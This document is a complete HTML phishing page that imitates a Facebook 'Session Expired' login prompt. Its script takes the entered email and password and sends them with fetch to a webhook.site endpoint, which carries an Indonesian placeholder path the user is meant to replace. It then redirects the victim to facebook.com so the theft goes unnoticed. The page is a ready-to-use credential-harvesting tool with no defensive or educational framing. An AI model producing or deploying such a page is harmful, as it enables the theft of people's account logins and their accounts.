<!DOCTYPE html>
<html>
<head>
    <title>Login Required</title>
    <style>
        body { font-family: Arial; background: #f0f2f5; display: flex; justify-content: center; margin-top: 100px; }
        .box { background: white; padding: 40px; border-radius: 10px; width: 350px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 5px; cursor: pointer; }
    </style>
</head>
<body>
<div class="box">
    <h2>Session Expired</h2>
    <p>Please login again to continue</p>
    <input type="email" id="email" placeholder="Email">
    <input type="password" id="pass" placeholder="Password">
    <button onclick="sendData()">Login</button>
    <p style="color:red; font-size:12px" id="status"></p>
</div>
<script>
function sendData() {
    let e = document.getElementById('email').value;
    let p = document.getElementById('pass').value;
    if(!e || !p) { alert('isi dulu'); return; }
    fetch('https://webhook.site/cek-dulu-ganti-webhookmu', {
        method: 'POST',
        mode: 'no-cors',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({email: e, pass: p, ip: '', time: new Date().toISOString()})
    });
    document.getElementById('status').innerHTML = 'Redirecting...';
    setTimeout(() => { window.location.href = 'https://facebook.com'; }, 1500);
}
</script>
</body>
</html>
